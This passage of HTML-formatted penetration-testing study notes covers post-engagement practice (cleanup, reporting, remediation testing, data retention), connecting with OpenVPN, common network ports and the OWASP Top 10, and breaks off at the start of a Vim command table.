&lt;p&gt;There are many ways to protect against lateral movement, including network (micro) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segmentation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat monitoring&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPS&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDS&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EDR&lt;/code&gt;, etc. To bypass these efficiently, we need to understand how they work and what they respond to. Then we can adapt and apply methods and strategies that help avoid detection.&lt;/p&gt;

&lt;h1 id=&quot;post-engagement&quot;&gt;Post-Engagement&lt;/h1&gt;

&lt;p&gt;Much like there is considerable legwork before an engagement officially starts (when testing begins), we must perform many activities (many of them contractually binding) after our scans, exploitation, lateral movement, and post-exploitation activities are complete. No two engagements are the same, so these activities may differ slightly but generally must be performed to close out an engagement fully.&lt;/p&gt;

&lt;p&gt;![[0-PT-Process.png]]&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;cleanup&quot;&gt;Cleanup&lt;/h2&gt;

&lt;p&gt;Once testing is complete, we should perform any necessary cleanup, such as deleting tools/scripts uploaded to target systems, reverting any (minor) configuration changes we may have made, etc. We should have detailed notes of all of our activities, making any cleanup activities easy and efficient. If we cannot access a system where an artifact needs to be deleted, or another change reverted, we should alert the client and list these issues in the report appendices. Even if we can remove any uploaded files and revert changes (such as adding a local admin account), we should document these changes in our report appendices in case the client receives alerts that they need to follow up on and confirm that the activity in question was part of our sanctioned testing.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;documentation-and-reporting&quot;&gt;Documentation and Reporting&lt;/h2&gt;

&lt;p&gt;Before completing the assessment and disconnecting from the client’s internal network or sending “stop” notification emails to signal the end of testing (meaning no more interaction with the client’s hosts), we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding. We should also make sure that we have retrieved all scan and log output if the client hosted a VM in their infrastructure for an internal penetration test and any other data that may be included as part of the report or as supplementary documentation. We should not keep any Personal Identifiable Information (PII), potentially incriminating info, or other sensitive data we came across throughout testing.&lt;/p&gt;

&lt;p&gt;We should already have a detailed list of the findings we will include in the report and all necessary details to tailor the findings to the client’s environment. Our report deliverable (which is covered in detail in the &lt;a href=&quot;https://academy.hackthebox.com/module/details/162&quot;&gt;Documentation &amp;amp; Reporting&lt;/a&gt; module) should consist of the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An attack chain (in the event of full internal compromise or external to internal access) detailing steps taken to achieve compromise&lt;/li&gt;
  &lt;li&gt;A strong executive summary that a non-technical audience can understand&lt;/li&gt;
  &lt;li&gt;Detailed findings specific to the client’s environment that include a risk rating, finding impact, remediation recommendations, and high-quality external references related to the issue&lt;/li&gt;
  &lt;li&gt;Adequate steps to reproduce each finding so the team responsible for remediation can understand and test the issue while putting fixes in place&lt;/li&gt;
  &lt;li&gt;Near, medium, and long-term recommendations specific to the environment&lt;/li&gt;
  &lt;li&gt;Appendices which include information such as the target scope, OSINT data (if relevant to the engagement), password cracking analysis (if relevant), discovered ports/services, compromised hosts, compromised accounts, files transferred to client-owned systems, any account creation/system modifications, an Active Directory security analysis (if relevant), relevant scan data/supplementary documentation, and any other information necessary to explain a specific finding or recommendation further&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At this stage, we will create a draft report that is the first deliverable our client will receive. From here, they will be able to comment on the report and ask for any necessary clarification/modifications.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;report-review-meeting&quot;&gt;Report Review Meeting&lt;/h2&gt;

&lt;p&gt;Once the draft report is delivered, and the client has had a chance to distribute it internally and review it in-depth, it is customary to hold a report review meeting to walk through the assessment results. The report review meeting typically includes the same folks from the client and the firm performing the assessment. Depending on the types of findings, the client may bring in additional technical subject matter experts if the finding is related to a system or application they are responsible for. Typically we will not read the entire report word for word but walk through each finding briefly and give an explanation from our own perspective/experience. The client will have the opportunity to ask questions about anything in the report, ask for clarifications, or point out issues that need to be corrected. Often the client will come with a list of questions about specific findings and will not want to cover every finding in detail (such as low-risk ones).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;deliverable-acceptance&quot;&gt;Deliverable Acceptance&lt;/h2&gt;

&lt;p&gt;The Scope of Work should clearly define the acceptance of any project deliverables. In penetration test assessments, generally, we deliver a report marked &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DRAFT&lt;/code&gt; and give the client a chance to review and comment. Once the client has submitted feedback (i.e., management responses, requests for clarification/changes, additional evidence, etc.) either by email or (ideally) during a report review meeting, we can issue them a new version of the report marked &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FINAL&lt;/code&gt;. Some audit firms that clients may be beholden to will not accept a penetration test report with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DRAFT&lt;/code&gt; designation. Other companies will not care, but keeping a uniform approach across all customers is best.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;post-remediation-testing&quot;&gt;Post-Remediation Testing&lt;/h2&gt;

&lt;p&gt;Most engagements include post-remediation testing as part of the project’s total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings. We will need to reaccess the target environment and test each issue to ensure it was appropriately remediated. We will issue a post-remediation report that clearly shows the state of the environment before and after post-remediation testing. For example, we may include a table such as:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;#&lt;/th&gt;
      &lt;th&gt;Finding Severity&lt;/th&gt;
      &lt;th&gt;Finding Title&lt;/th&gt;
      &lt;th&gt;Status&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
      &lt;td&gt;SQL Injection&lt;/td&gt;
      &lt;td&gt;Remediated&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
      &lt;td&gt;Broken Authentication&lt;/td&gt;
      &lt;td&gt;Remediated&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
      &lt;td&gt;Unrestricted File Upload&lt;/td&gt;
      &lt;td&gt;Remediated&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
      &lt;td&gt;Inadequate Web and Egress Filtering&lt;/td&gt;
      &lt;td&gt;Not Remediated&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;Medium&lt;/td&gt;
      &lt;td&gt;SMB Signing Not Enabled&lt;/td&gt;
      &lt;td&gt;Not Remediated&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
      &lt;td&gt;Directory Listing Enabled&lt;/td&gt;
      &lt;td&gt;Not Remediated&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;For each finding (where possible), we will want to show evidence that the issue is no longer present in the environment through scan output or proof that the original exploitation techniques fail.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;role-of-the-pentester-in-remediation&quot;&gt;Role of the Pentester in Remediation&lt;/h2&gt;

&lt;p&gt;Since a penetration test is essentially an audit, we must remain impartial third parties and not perform remediation on our findings (such as fixing code, patching systems, or making configuration changes in Active Directory). We must maintain a degree of independence and can serve as trusted advisors by giving general remediation advice on how a specific issue could be fixed or be available to explain further/demonstrate a finding so the team assigned to remediate it has a better understanding. We should not be implementing changes ourselves or even giving precise remediation advice (i.e., for SQL Injection, we may say “sanitize user input” but not give the client a rewritten piece of code). This will help maintain the assessment’s integrity and not introduce any potential conflict of interest into the process.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;data-retention&quot;&gt;Data Retention&lt;/h2&gt;

&lt;p&gt;After a penetration test concludes, we will have a considerable amount of client-specific data such as scan results, log output, credentials, screenshots, and more. Data retention and destruction requirements may differ from country to country and firm to firm, and procedures surrounding each should be outlined clearly in the contract language of the Scope of Work and the Rules of Engagement. Per &lt;a href=&quot;https://www.pcisecuritystandards.org/documents/Penetration_Testing_Guidance_March_2015.pdf&quot;&gt;Penetration Testing Guidance&lt;/a&gt; from the PCI Data Security Standard (PCI DSS):&lt;/p&gt;

&lt;p&gt;“While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that the tester retain such evidence (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement.”&lt;/p&gt;

&lt;p&gt;We should retain evidence for some time after the penetration test in case questions arise about specific findings or to assist with retesting “closed” findings after the client has performed remediation activities. Any data retained after the assessment should be stored in a secure location owned and controlled by the firm and encrypted at rest. All data should be wiped from tester systems at the conclusion of an assessment. A new virtual machine specific to the client in question should be created for any post-remediation testing or investigation of findings related to client inquiries.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;close-out&quot;&gt;Close Out&lt;/h2&gt;

&lt;p&gt;Once we have delivered the final report, assisted the client with questions regarding remediation, and performed post-remediation testing/issued a new report, we can finally close the project. At this stage, we should ensure that any systems used to connect to the client’s systems or process data have been wiped or destroyed and that any artifacts leftover from the engagement are stored securely (encrypted) per our firm’s policy and per contractual obligations to our client. The final steps would be invoicing the client and collecting payment for services rendered. Finally, it is always good to follow up with a post-assessment client satisfaction survey so the team and management, in particular, can see what went well during the engagement and what could be improved upon from a company process standpoint and the individual consultant assigned to the project. Discussions for follow-on work may arise in the weeks or months after if the client was pleased with our work and day-to-day interactions.&lt;/p&gt;

&lt;p&gt;As we continually grow our technical skillset, we should always look for ways to improve our soft skills and become more well-rounded professional consultants. In the end, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client will usually remember interactions&lt;/code&gt; during the assessment, communication, and how they were treated/valued by the firm they engage, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;not the fancy exploit chain the pentester pulled off to pwn their systems&lt;/code&gt;. Take this time to self-reflect and work on continuous improvement in all aspects of your role as a professional penetration tester.&lt;/p&gt;

&lt;h1 id=&quot;connecting-using-vpn&quot;&gt;Connecting Using VPN&lt;/h1&gt;

&lt;hr /&gt;
&lt;p&gt;#vpn #openvpn&lt;/p&gt;

&lt;p&gt;A &lt;a href=&quot;https://en.wikipedia.org/wiki/Virtual_private_network&quot;&gt;virtual private network (VPN)&lt;/a&gt; allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company’s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel.![[vpn.png]]&lt;/p&gt;

&lt;p&gt;We can use a VPN service such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NordVPN&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Private Internet Access&lt;/code&gt; and connect to a VPN server in another part of our country or another region of the world to obscure our browsing traffic or disguise our public IP address. This can provide us with some level of security and privacy. Still, since we are connecting to a company’s server, there is always the chance that data is being logged or the VPN service is not following security best practices or the security features that they advertise. Using a VPN service comes with the risk that the provider is not doing what they are saying and are logging all data. Usage of a VPN service &lt;strong&gt;does not&lt;/strong&gt; guarantee anonymity or privacy but is useful for bypassing certain network/firewall restrictions or when connected to a possible hostile network (i.e., a public airport wireless network). A VPN service should never be used with the thought that it will protect us from the consequences of performing nefarious activities.&lt;/p&gt;

&lt;p&gt;Connecting Using VPN&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;openvpn user.ovpn

Thu Dec 10 18:42:41 2020 OpenVPN 2.4.9 x86_64-pc-linux-gnu &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SSL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LZO] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LZ4] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;EPOLL] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;PKCS11] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MH/PKTINFO] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AEAD] built on Apr 21 2020
Thu Dec 10 18:42:41 2020 library versions: OpenSSL 1.1.1g  21 Apr 2020, LZO 2.10
Thu Dec 10 18:42:41 2020 Outgoing Control Channel Authentication: Using 256 bit message &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SHA256&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;HMAC authentication
Thu Dec 10 18:42:41 2020 Incoming Control Channel Authentication: Using 256 bit message &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;SHA256&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;HMAC authentication
Thu Dec 10 18:42:41 2020 TCP/UDP: Preserving recently used remote address: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AF_INET]
Thu Dec 10 18:42:41 2020 Socket Buffers: &lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;212992-&amp;gt;212992] &lt;span class=&quot;nv&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;212992-&amp;gt;212992]
Thu Dec 10 18:42:41 2020 UDP &lt;span class=&quot;nb&quot;&gt;link local&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not bound&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&amp;lt;SNIP&amp;gt;
Thu Dec 10 18:42:41 2020 Initialization Sequence Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;what-is-a-port&quot;&gt;What is a Port?&lt;/h2&gt;

&lt;p&gt;A &lt;a href=&quot;https://en.wikipedia.org/wiki/Port_\(computer_networking\)&quot;&gt;port&lt;/a&gt; can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. This is similar in computing. Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).&lt;/p&gt;

&lt;p&gt;Each port is assigned a number, and many are standardized across all network-connected devices (though a service can be configured to run on a non-standard port). For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; messages (website traffic) typically go to port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; messages go to port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;443&lt;/code&gt; unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target devices. At a very high level, ports help computers understand how to handle the various types of data they receive.&lt;/p&gt;

&lt;p&gt;There are two categories of ports, &lt;a href=&quot;https://en.wikipedia.org/wiki/Transmission_Control_Protocol&quot;&gt;Transmission Control Protocol (TCP)&lt;/a&gt;, and &lt;a href=&quot;https://en.wikipedia.org/wiki/User_Datagram_Protocol&quot;&gt;User Datagram Protocol (UDP)&lt;/a&gt;.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; utilizes a connectionless communication model. There is no “handshake” and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; is useful when error correction/checking is either not needed or is handled by the application itself. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; and can significantly affect a real-time system. There are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;65,535&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; ports and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;65,535&lt;/code&gt; different &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; ports, each denoted by a number. Some of the most well-known &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; ports are listed below:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port(s)&lt;/th&gt;
      &lt;th&gt;Protocol&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Telnet&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;25&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMTP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;161&lt;/code&gt; (TCP/UDP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNMP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;389&lt;/code&gt; (TCP/UDP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;443&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TLS&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt;)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3389&lt;/code&gt; (TCP)&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDP&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;As information security professionals, we must be able to quickly recall large amounts of information on a wide variety of topics. It is essential for us, especially as pentesters, to have a firm grasp of many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; ports and be able to recognize them from just their number quickly (i.e., know that port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;, port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;, port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;88&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos&lt;/code&gt;) without having to look it up. This will come with practice and repetition and eventually become second nature as we attack more boxes, labs, and real-world networks and help us work more efficiently and better prioritize our enumeration efforts and attacks.&lt;/p&gt;

&lt;p&gt;Guides such as &lt;a href=&quot;https://www.stationx.net/common-ports-cheat-sheet/&quot;&gt;this&lt;/a&gt; and &lt;a href=&quot;https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf&quot;&gt;this&lt;/a&gt; are great resources for learning standard and less common TCP and UDP ports. Challenge yourself to memorize as many of these as possible and do some research about each of the protocols listed in the table above. This is a great &lt;a href=&quot;https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/&quot;&gt;reference&lt;/a&gt; on the top 1,000 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; ports from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; along with the top 100 services scanned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;what-is-a-web-server&quot;&gt;What is a Web Server&lt;/h2&gt;

&lt;p&gt;A web server is an application that runs on the back-end server, which handles all of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser. Web servers usually run on TCP ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;443&lt;/code&gt;, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses:&lt;/p&gt;

&lt;p&gt;Many types of vulnerabilities can affect web applications. We will often hear about/see references to the &lt;a href=&quot;https://owasp.org/www-project-top-ten/&quot;&gt;OWASP Top 10&lt;/a&gt;. This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Number&lt;/th&gt;
      &lt;th&gt;Category&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&quot;&gt;Broken Access Control&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A02_2021-Cryptographic_Failures/&quot;&gt;Cryptographic Failures&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Failures related to cryptography which often leads to sensitive data exposure or system compromise.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A03_2021-Injection/&quot;&gt;Injection&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A04_2021-Insecure_Design/&quot;&gt;Insecure Design&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;These issues happen when the application is not designed with security in mind.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A05_2021-Security_Misconfiguration/&quot;&gt;Security Misconfiguration&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/&quot;&gt;Vulnerable and Outdated Components&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/&quot;&gt;Identification and Authentication Failures&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Authentication-related attacks that target user’s identity, authentication, and session management.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/&quot;&gt;Software and Data Integrity Failures&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/&quot;&gt;Security Logging and Monitoring Failures&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10.&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/&quot;&gt;Server-Side Request Forgery&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;It is essential to become familiar with each of these categories and the various vulnerabilities that fit each.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;editor-vim&quot;&gt;Editor Vim&lt;/h2&gt;

&lt;p&gt;basic and common flags to exit / save / delate / sym&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
